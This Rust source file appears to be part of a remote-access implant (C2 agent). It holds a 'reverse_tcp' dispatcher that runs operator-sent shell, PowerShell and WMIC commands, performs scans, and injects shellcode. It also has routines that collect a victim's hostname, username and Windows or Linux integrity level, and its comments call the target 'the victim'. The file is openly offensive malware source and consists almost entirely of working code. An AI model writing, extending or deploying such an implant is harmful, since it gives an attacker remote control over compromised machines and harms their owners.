

use serde::{Serialize, Deserialize};
use std::process::Command;
use std::str;
use std::collections::HashMap;

mod commands;

#[derive(Serialize, Deserialize, Clone)]
pub struct TcpAgentCommunication {
    pub agent_uid: String,
    pub agent_type: String,
    pub agent_os: String,
    pub activated: bool,
    pub hostname: String,
    pub username: String,
    pub task_uid: String,
    pub cmd_result: bool,
    pub cmd_request: String,
    pub cmd_result_stdout: String,
    pub cmd_result_stderr: String,
    pub integrity_level: String,
}



//pub fn reverse_tcp(mut agent_com: TcpAgentCommunication, cmd_arg: String) -> String {
//pub fn reverse_tcp(mut agent_com: TcpAgentCommunication, cmd_arg: String) -> TcpAgentCommunication {
pub fn reverse_tcp(cmd_request: String, cmd_arg: String) -> String {
    //let r_b64 = match agent_com.cmd_request.as_str() {
    //match agent_com.cmd_request.as_str() {
    let r: String = match cmd_request.as_str() {
        "CMD" => {
            let output: std::process::Output;
            
            if cfg!(target_os = "linux"){
                output = commands::cmd::cmd(cmd_arg);
            } else {
                output = commands::cmd::cmd(cmd_arg);
            }

            if output.status.success() {
                //println!("stdout: {:#?}", str::from_utf8(&output.stdout).unwrap());
                String::from_utf8_lossy(&output.stdout).to_string()
            }
            else {
                //println!("stderr: {:#?}", str::from_utf8(&output.stderr).unwrap());
                String::from_utf8_lossy(&output.stderr).to_string()
            }
          
        }
        "PSH" => {
            let output: std::process::Output;
            if cfg!(target_os = "linux"){
                output = commands::psh::psh(cmd_arg);
            } else {
                output = commands::psh::psh(cmd_arg);
            }

            
            if output.status.success() {
                //println!("stdout: {:#?}", str::from_utf8(&output.stdout).unwrap());
                String::from_utf8_lossy(&output.stdout).to_string()

            }
            else {
                //println!("stderr: {:#?}", str::from_utf8(&output.stderr).unwrap());
                String::from_utf8_lossy(&output.stderr).to_string()
            }
            
        }
        "SCAN" => {
            let (output_result, output_error): (String, String) = commands::scan::scan(cmd_arg);
            output_result
        }
        "ASM" => {
            let (output_result, output_error): (String, String) = commands::asm::asm(cmd_arg);
            output_result
        }
        "INJECT_SC" => {
            let (output_result, output_error): (String, String) = commands::inject_sc::inject_sc(cmd_arg);
            output_result
        }
        #[cfg(windows)]
        "WMIC" => {
            if cfg!(target_os = "linux"){
                //output = command::cmd::execute_lin(cmd_arg);
                "".to_string()
            } else {
                #[cfg(windows)]
                let (output_result, output_error): (String, String) = commands::wmic::wmic(cmd_arg);
                output_result
            }
        }
        /*"UPLOAD" => {
            let (output_result, output_error): (String, String) = commands::upload::upload(cmd_arg);
            agent_com.cmd_result_stdout = output_result;
            agent_com.cmd_result_stderr = output_error;
            tcp_parse_cmd_result(agent_com.clone())
        }
        "DOWNLOAD" => {
            let (output_result, output_error): (String, String) = commands::download::download(cmd_arg);
            agent_com.cmd_result_stdout = output_result;
            agent_com.cmd_result_stderr = output_error;
            tcp_parse_cmd_result(agent_com.clone())
        }*/
        #[cfg(windows)]
        "PIPES_LS" => {
            let output: std::process::Output;
            
            if cfg!(target_os = "windows"){
                //#[cfg(windows)]
                output = commands::pipes_list::pipes_list();
        
                if output.status.success() {
                    //println!("stdout: {:#?}", str::from_utf8(&output.stdout).unwrap());
                    String::from_utf8_lossy(&output.stdout).to_string()

                }
                else {
                    //println!("stderr: {:#?}", str::from_utf8(&output.stderr).unwrap());
                    String::from_utf8_lossy(&output.stderr).to_string()

                }
            }
            else {
                "".to_string()
            }
        }
        _ => {
            "command unknown ...\r\n".to_string()     
        }
    };

    r
    //agent_com
}

pub fn tcp_parse_cmd_result(agent_com: TcpAgentCommunication) -> String {

    let init_json = serde_json::to_string(&agent_com);

    /*let output_b64 = tcp_encoding(init_json.unwrap());

    output_b64*/
    init_json.unwrap()
}


pub fn get_tcp_info(agent_uid: String) -> TcpAgentCommunication {
    // send info about the victim
    let hostname = Command::new("hostname")
        .output()
        .expect("");

    let username = Command::new("whoami")
        .output()
        .expect("");

    let agent_os: String;
    if cfg!(target_os = "linux"){
        agent_os = "linux".to_string();
    }
    else {
        agent_os = "windows".to_string();
    }

    let integrity_level: String = get_integrity_level(agent_os.clone());

    let r: TcpAgentCommunication = TcpAgentCommunication {
        agent_uid: agent_uid,
        agent_type: "tcp".to_owned(),
        agent_os: agent_os.clone(),
        activated: true,
        hostname: String::from_utf8_lossy(&hostname.stdout).to_string(),
        username: String::from_utf8_lossy(&username.stdout).to_string(),
        task_uid: "".to_string(),
        cmd_result: false,
        cmd_request: "".to_string(),
        cmd_result_stdout: "".to_string(),
        cmd_result_stderr: "".to_string(),
        integrity_level: integrity_level,
    };
    return r
}

pub fn clear_tcp_info(mut agent_com: TcpAgentCommunication) -> Result<(), ()> {
    agent_com.task_uid = "".to_string();
    agent_com.cmd_result = false;
    agent_com.cmd_request = "".to_string();
    agent_com.cmd_result_stdout = "".to_string();
    agent_com.cmd_result_stderr = "".to_string();

    Ok(())
}



fn get_integrity_level(agent_os: String) -> String {
    

    let mut integrity_level: &str = "medium";
    if cfg!(target_os = "linux"){
        let username = Command::new("whoami")
                        .output()
                        .expect("");

        integrity_level = match String::from_utf8_lossy(&username.stdout).to_string().as_str() {
            "root\n" => {"high"},
            _ => {"medium"},
        };
        //println!("{:#?}", integrity_level);
    }
    else {
        let mut integrity_levels = HashMap::new();

        // docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab
        integrity_levels.insert("untrusted", "S-1-16-0");
        integrity_levels.insert("low", "S-1-16-4096");
        integrity_levels.insert("medium", "S-1-16-8192");
        integrity_levels.insert("medium_plus", "S-1-16-8448");
        integrity_levels.insert("high", "S-1-16-12288");
        integrity_levels.insert("system", "S-1-16-16384");
        integrity_levels.insert("protected_process", "S-1-16-20480");

        for (key, value) in integrity_levels.iter() {
            let groups = Command::new("whoami")
                        .arg("/groups")
                        .output()
                        .expect("");
            let groups_str: String = String::from_utf8_lossy(&groups.stdout).to_string();
            if groups_str.contains(value) {
                integrity_level = key;
                break;
            }
        }
        
    }

    integrity_level.to_string()
}